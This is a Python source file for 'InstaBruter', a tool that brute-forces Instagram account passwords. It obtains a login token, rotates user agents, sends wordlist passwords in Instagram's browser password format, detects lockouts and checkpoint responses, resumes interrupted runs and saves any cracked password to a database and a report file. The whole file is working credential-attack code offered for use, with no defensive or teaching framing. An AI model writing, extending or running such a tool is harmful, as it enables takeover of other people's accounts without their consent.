import csv
import json
from datetime import datetime
from random import choice
from time import ctime, time

import requests
from requests import Session

from const import browser_data, response_codes, user_agents
from database import DatabaseWrapper

class InstaBruter:
    Total_Trials = 0
    BLOCKED = 0
    def __init__(self, ID):
        self.ID = ID
        self.username = DatabaseWrapper().GET(ID, 'Username')
        self.main = DatabaseWrapper().GET(ID, 'Main')
        self.Fisrt = True
        self.account_exists = None
        self.is_found = False
        self.PASSWORD = None
        self.trials = 0
        self.time = time()
        try : self.token = self.get_token()
        except : self.quit()
        else : self.start()

    def start(self):
        wordlist = self.wordlist()
        session = self.sess(True)
        breaking = False

        for Password in wordlist:
            password = str(Password.format(self.main))
            response = self.post(session, password)
            resp = self.authenicate(response)
            
            if resp["attempted"]:
                self.trials += 1
                
                if not resp["locked"]:
                    self.Fisrt = False
                    if resp["accessed"]:
                        session.close()
                        self.PASSWORD = password
                        self.is_found = True
                        breaking = True

                elif resp['locked']:
                    session.close()
                    self.trials -= 1
                    resp['attempted'], breaking= False, True

                else :
                    self.closure(response)

            self.write(password, f" Attempted : {resp['attempted']}")
            if breaking: break

        self.closure(self.is_found)

    def get_token(self):
        session = self.sess()
        return session.get(browser_data['home_url']).cookies['ig_did']
        session.close()

    def sess(self, posting=False):
        session =  Session()
        header = browser_data["header"]
        header["User-Agent"] = choice(user_agents)
        if posting : header["x-csrftoken"] = self.token
        session.headers.update(header)
        return session
    
    def payload(self, password):
        time = int(datetime.now().timestamp()) 
        return {browser_data['username_field']: self.username,
        browser_data['password_field']: f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',}

    def post(self, session, password):
        return session.post(browser_data["login_url"], data=self.payload(password)).json()

    def check_exists(self, response):
        if "user" in response:
            self.account_exists = response["user"]
            if self.account_exists == True:
                pass
            elif not self.account_exists:
                print('Username Not Found', self.username)
                self.closure(f'Username Not Found : {self.username}')
            else :
                print('Response aspects have benn changed : \n', response)
                self.closure(f'Response aspects have benn changed : \n {response}')

    def check_response(self, response):
        if "authenticated" in response:
            if response["authenticated"]:
                return response_codes["succeed"]

        if "message" in response:
            if response.get("checkpoint_url", None):
                return response_codes["succeed"]
            if response["status"] == "fail":
                return response_codes["locked"]

        if "errors" in response:
            return response_codes["locked"]
            self.closure(response)
        return response_codes["failed"]
    
    def authenicate(self, response):
        print(response)
        resp = {"attempted": False, "accessed": False, "locked": False}
        if response != None:
            resp["attempted"] = True
            resp_code = self.check_response(response)

            if resp_code == response_codes["locked"]:
                resp["locked"] = True

            if resp_code == response_codes["succeed"]:
                resp["accessed"] = True

            if resp_code == response_codes['failed']:
                self.check_exists(response)

            if self.account_exists == None:
                self.check_exists(response)

        return resp

    def closure(self, success):
        if success == True:
            ID = self.ID
            DatabaseWrapper().UPDATE(ID, 'Trials', self.trials) 
            DatabaseWrapper().UPDATE(ID, 'Time', f'{(time() - self.time)}')
            DatabaseWrapper().UPDATE(ID, 'Success', self.is_found)
            DatabaseWrapper().UPDATE(ID, 'Password', self.PASSWORD) 
            DatabaseWrapper().UPDATE(ID, 'Ctime', ctime())
            print('Password Found :', self.PASSWORD)
            with open('Report2.txt', 'a') as f:
                f.write(f'A password has been found for {self.username} : {self.PASSWORD} \n')
                f.write(f'At {ctime()}\n')
                f.write('Congrats!\n\n')
            InstaBruter.Total_Trials += 9


        elif success == False: 
            ID = self.ID
            DatabaseWrapper().UPDATE(ID, 'Trials', self.trials) 
            DatabaseWrapper().UPDATE(ID, 'Time', f'{(time() - self.time)}')
            DatabaseWrapper().UPDATE(ID, 'Ctime', ctime())
            if not self.Fisrt : 
                DatabaseWrapper().UPDATE(ID, 'Rtime', time())
            print('Password not found :', self.username)
            InstaBruter.Total_Trials += self.trials
        else :
            print('A problem has been reported during ;', self.username)
            with open('Report.txt', 'a') as f:
                f.write(f'A problem has benn reported during ; {self.username} \n')
                f.write(f'During the {self.trials} trial :')
                f.write((str(success) + '\n\n'))

    def proxy_manager(self):
        with open('http_proxies.txt', "r") as f:
            proxies = [proxy.strip() for proxy in f.readlines()]
            return proxies
    
    def proxy_pruner(self):
        return {'http' : f'http://{self.proxies.pop()}'}

    def wordlist(self, mode=0):
        if mode == 0:
            with open('passwords.txt', "r") as f:
                wordlist = [each.strip() for each in f.readlines()]
                trials = DatabaseWrapper().GET(self.ID, 'Trials')
                for tried in range(trials): wordlist.pop(0)
                return wordlist
        else :
            import wordlist
            generator = wordlist.Generator('1234567890')
            wordlist = [each.strip() for each in generator.generate_with_pattern('{}@@@@')]
            return wordlist

    def write(self, *infos) -> None:
        infos = list(infos)
        with open('attempts.csv', 'a') as f: 
            csv.writer(f).writerow(infos)

    def quit(self):
        self.closure(f'The token request has been blocked at{ctime()}')
        InstaBruter.BLOCKED += 1
        if InstaBruter.BLOCKED == 4: exit()
